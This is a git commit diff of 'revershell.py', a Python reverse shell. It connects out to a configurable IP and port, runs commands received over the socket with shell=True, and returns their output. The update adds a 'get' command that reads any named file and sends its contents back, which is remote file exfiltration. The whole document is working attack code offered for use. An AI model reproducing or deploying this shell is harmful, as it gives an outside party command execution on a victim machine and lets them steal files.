617cec6f5dbb2e0d042da5f0daa90768307d3c59
Saiprakash J <jsprakash632@gmail.com>
2025-12-18 19:26:25 +0530

    Update revershell.py

--- revershell.py
+++ revershell.py
@@ -1,21 +1,39 @@
 import socket
 import os
+import subprocess
+
 
 new_request = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-new_request.connect(('127.0.0.1', 4444))  #change ip and port
-new_request.send("connection made ... \n ".encode())
+new_request.connect(('127.0.0.1', 1234))  #change ip and port
+new_request.send("connection made ...".encode())
 
 while True:
-    new_request.send(f"{os.getcwd()} >>> ".encode())
-    cmd = new_request.recv(1024).decode()
-
-    if 'cd' in cmd:
+    cmd = new_request.recv(1024).decode().strip()
+    if cmd.startswith("cd "):
         try:
             os.chdir(cmd[3:].strip())
-            command = os.popen(cmd).read()
+            command = os.popen('cd').read()
             new_request.send(command.encode())
         except FileNotFoundError as e:
             new_request.send("\n Directory Not Found \n ".encode())
 
-    command = os.popen(cmd).read()
-    new_request.send(command.encode())
+    elif cmd.startswith("get "):
+        filename = cmd[4:].strip()
+        size = os.path.getsize(filename)
+        new_request.sendall(f"{size}\n".encode())
+        try:
+            with open(filename, "rb") as f:
+                file_data = f.read()
+                new_request.sendall(file_data)
+                continue
+        except FileNotFoundError as e:
+            new_request.send("file not Found".encode())
+            continue
+
+    else:
+        command = subprocess.run(f"{cmd}",shell=True, text=True, capture_output=True)
+        output = command.stdout
+        if not output:
+            new_request.send(f"Invalid Command".encode())
+        else:
+            new_request.send(command.stdout.encode())
